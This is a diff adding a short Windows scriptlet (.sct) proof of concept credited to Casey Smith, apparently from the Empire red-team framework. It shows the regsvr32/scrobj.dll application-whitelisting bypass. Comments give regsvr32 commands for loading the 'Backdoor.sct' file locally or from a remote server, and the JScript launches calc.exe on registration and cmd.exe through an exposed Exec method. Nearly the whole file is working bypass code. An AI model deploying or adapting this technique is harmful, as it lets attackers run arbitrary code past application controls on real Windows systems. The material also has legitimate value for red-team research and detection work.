@@ -1,0 +1,37 @@
+<?XML version="1.0"?>
+<scriptlet>
+
+<registration
+    description="Empire"
+    progid="Empire"
+    version="1.00"
+    classid="{20001111-0000-0000-0000-0000FEEDACDC}"
+	>
+	<!-- regsvr32 /s /i"C:\Bypass\Backdoor.sct" scrobj.dll -->
+	<!-- regsvr32 /s /i:http://server/Backdoor.sct scrobj.dll -->
+	<!-- That should work over a proxy and SSL/TLS... -->
+	<!-- Proof Of Concept - Casey Smith @subTee -->
+	<script language="JScript">
+		<![CDATA[
+	
+			var r = new ActiveXObject("WScript.Shell").Run("calc.exe");	
+	
+		]]>
+</script>
+</registration>
+
+<public>
+    <method name="Exec"></method>
+</public>
+<script language="JScript">
+<![CDATA[
+	
+	function Exec()
+	{
+		var r = new ActiveXObject("WScript.Shell").Run("cmd.exe");
+	}
+	
+]]>
+</script>
+
+</scriptlet>
